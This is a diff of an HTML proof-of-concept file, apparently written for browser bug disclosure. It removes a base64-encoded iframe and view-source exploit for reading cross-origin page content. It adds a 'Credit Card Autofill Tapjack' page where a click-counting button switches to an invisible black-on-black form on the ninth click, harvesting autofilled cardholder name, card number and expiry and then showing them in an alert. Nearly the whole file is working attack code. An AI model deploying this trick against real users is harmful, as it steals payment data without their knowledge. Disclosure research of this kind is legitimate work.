@@ -1,53 +1,157 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC</title>
-    <script>
-    function poc() {
-/*
--- before --
-<html>
-<head>
-    <script>
-    function unescapeHTML(str) {
-        return str.replace(/&lt;/g,'<')
-                  .replace(/&gt;/g,'>')
-                  .replace(/&amp;/g,'&');
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Card Autofill Tapjack</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: white;
+            color: black;
+            transition: background-color 0.5s ease;
+        }
 
-    function poc() {
-        var text = ['iframe!'];
-        var blob = new Blob(text, {type : 'text/html'});
-        var url  = window.URL.createObjectURL(blob);
+        .button-container, .form-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
 
-        var iframe = document.getElementById('iframe');
-        iframe.src =  url;
-        setTimeout('iframe.contentWindow.location.protocol = "data"', 1000);
-        setTimeout('iframe.contentWindow.location.pathname="view-source:http://example.org"', 2000);
-        setTimeout('iframe.contentWindow.location.protocol="view-source"', 3000);
-        setTimeout('alert(unescapeHTML(iframe.contentWindow.document.body.innerHTML))', 4000);
-    }
-    <\/script> // <-- ******** If do base64 encode, please exclusion '\'. ********
-</head>
-<body onload="poc()">
-    <iframe id="iframe"></iframe>
-</body>
-</html>
+        .click-button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
 
--- after --
-PGh0bWw+DQo8aGVhZD4NCiAgICA8c2NyaXB0Pg0KICAgIGZ1bmN0aW9uIHVuZXNjYXBlSFRNTChzdHIpIHsNCiAgICAgICAgcmV0dXJuIHN0ci5yZXBsYWNlKC8mbHQ7L2csJzwnKQ0KICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyZndDsvZywnPicpDQogICAgICAgICAgICAgICAgICAucmVwbGFjZSgvJmFtcDsvZywnJicpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHBvYygpIHsNCiAgICAgICAgdmFyIHRleHQgPSBbJ2lmcmFtZSEnXTsNCiAgICAgICAgdmFyIGJsb2IgPSBuZXcgQmxvYih0ZXh0LCB7dHlwZSA6ICd0ZXh0L2h0bWwnfSk7DQogICAgICAgIHZhciB1cmwgID0gd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7DQoNCiAgICAgICAgdmFyIGlmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZnJhbWUnKTsNCiAgICAgICAgaWZyYW1lLnNyYyA9ICB1cmw7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sID0gImRhdGEiJywgMTAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnBhdGhuYW1lPSJ2aWV3LXNvdXJjZTpodHRwOi8vZXhhbXBsZS5vcmciJywgMjAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sPSJ2aWV3LXNvdXJjZSInLCAzMDAwKTsNCiAgICAgICAgc2V0VGltZW91dCgnYWxlcnQodW5lc2NhcGVIVE1MKGlmcmFtZS5jb250ZW50V2luZG93LmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKSknLCA0MDAwKTsNCiAgICB9DQogICAgPC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9InBvYygpIj4NCiAgICA8aWZyYW1lIGlkPSJpZnJhbWUiPjwvaWZyYW1lPg0KPC9ib2R5Pg0KPC9odG1sPg==
-*/
-        var blob = new Blob([atob('PGh0bWw+DQo8aGVhZD4NCiAgICA8c2NyaXB0Pg0KICAgIGZ1bmN0aW9uIHVuZXNjYXBlSFRNTChzdHIpIHsNCiAgICAgICAgcmV0dXJuIHN0ci5yZXBsYWNlKC8mbHQ7L2csJzwnKQ0KICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyZndDsvZywnPicpDQogICAgICAgICAgICAgICAgICAucmVwbGFjZSgvJmFtcDsvZywnJicpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHBvYygpIHsNCiAgICAgICAgdmFyIHRleHQgPSBbJ2lmcmFtZSEnXTsNCiAgICAgICAgdmFyIGJsb2IgPSBuZXcgQmxvYih0ZXh0LCB7dHlwZSA6ICd0ZXh0L2h0bWwnfSk7DQogICAgICAgIHZhciB1cmwgID0gd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7DQoNCiAgICAgICAgdmFyIGlmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZnJhbWUnKTsNCiAgICAgICAgaWZyYW1lLnNyYyA9ICB1cmw7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sID0gImRhdGEiJywgMTAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnBhdGhuYW1lPSJ2aWV3LXNvdXJjZTpodHRwOi8vZXhhbXBsZS5vcmciJywgMjAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sPSJ2aWV3LXNvdXJjZSInLCAzMDAwKTsNCiAgICAgICAgc2V0VGltZW91dCgnYWxlcnQodW5lc2NhcGVIVE1MKGlmcmFtZS5jb250ZW50V2luZG93LmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKSknLCA0MDAwKTsNCiAgICB9DQogICAgPC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9InBvYygpIj4NCiAgICA8aWZyYW1lIGlkPSJpZnJhbWUiPjwvaWZyYW1lPg0KPC9ib2R5Pg0KPC9odG1sPg==')], {type : 'text/html'});
-        var url = window.URL.createObjectURL(blob);
+        .form-container {
+            display: none; /* Initially hidden */
+            padding: 20px;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+            width: 300px;
+            background-color: white;
+            color: black;
+            text-align: left;
+            transition: background-color 0.5s ease;
+        }
 
-        x = (screen.width) / 1 - 10;
-        y = (screen.height) / 1 - 100;
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
 
-        window.open('redirect.php?url=' + url, 'blob', 'screenX=0,screenY=0,left=0,top=0,width='+x+',height='+y+',scrollbars=yes,toolbar=yes,menubar=yes,staus=yes,resizable=yes,location=yes');
-    }
-    </script>
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: white;
+            color: black;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        input::placeholder {
+            color: #666;
+        }
+
+        input:focus {
+            border: 1px solid #007bff;
+        }
+
+        /* Dark Mode for Tapjacking */
+        .dark-mode {
+            background-color: black !important;
+            color: black !important;
+        }
+
+        .dark-mode input {
+            background-color: black !important;
+            color: black !important;
+            border: 1px solid black !important;
+        }
+
+        .dark-mode input::placeholder {
+            color: black !important;
+        }
+    </style>
 </head>
 <body>
-<a href="#" onclick="poc()">CLICK ME!</a>
+
+    <!-- Button in the center -->
+    <div id="buttonContainer" class="button-container">
+        <button id="clickButton" class="click-button">Click Me</button>
+    </div>
+
+    <!-- Credit Card Form (Initially Hidden) -->
+    <div id="formContainer" class="form-container">
+        <h2>Credit Card Autofill Test</h2>
+        <form id="creditCardForm">
+            <label for="cc-name">Cardholder Name:</label>
+            <input type="text" id="cc-name" name="Cardholder Name" autocomplete="cc-name" required placeholder="Enter Name">
+
+            <label for="cc-number">Card Number:</label>
+            <input type="text" id="cc-number" name="Card Number" autocomplete="cc-number" required placeholder="Enter Card Number">
+
+            <label for="cc-exp">Expiration Date (MM/YY):</label>
+            <input type="text" id="cc-exp" name="Expiration Date" autocomplete="cc-exp" required placeholder="MM/YY">
+        </form>
+    </div>
+
+    <script>
+        let clickCount = 0;
+
+        // Button Click Logic
+        document.getElementById("clickButton").addEventListener("click", function() {
+            clickCount++;
+            
+            if (clickCount < 8) {
+                this.innerText = "Clicked " + clickCount;
+            } else if (clickCount === 9) {
+                // Apply dark mode
+                document.body.classList.add("dark-mode");
+                document.getElementById("formContainer").classList.add("dark-mode");
+                
+                // Hide button and show form
+                document.getElementById("buttonContainer").style.display = "none";
+                document.getElementById("formContainer").style.display = "block";
+                document.getElementById("cc-name").focus();
+            } else {
+                document.getElementById("cc-name").focus();
+            }
+        });
+
+        // Input tracking logic
+        let formData = { "Cardholder Name": "", "Card Number": "", "Expiration Date": "" };
+
+        document.querySelectorAll("input").forEach(input => {
+            input.addEventListener("input", function() {
+                formData[this.name] = this.value; // Store the value
+                
+                // Check if all fields are filled
+                if (formData["Cardholder Name"] && formData["Card Number"] && formData["Expiration Date"]) {
+                    // Before alerting, restore button and hide form
+                    document.getElementById("buttonContainer").style.display = "block"; // Show button
+                    document.getElementById("formContainer").style.display = "none"; // Hide form
+
+                    // Reset background
+                    document.body.classList.remove("dark-mode");
+                    document.getElementById("formContainer").classList.remove("dark-mode");
+
+                    alert(`Cardholder Name: ${formData["Cardholder Name"]}\nCard Number: ${formData["Card Number"]}\nExpiration Date: ${formData["Expiration Date"]}`);
+                }
+            });
+        });
+    </script>
+
 </body>
 </html>
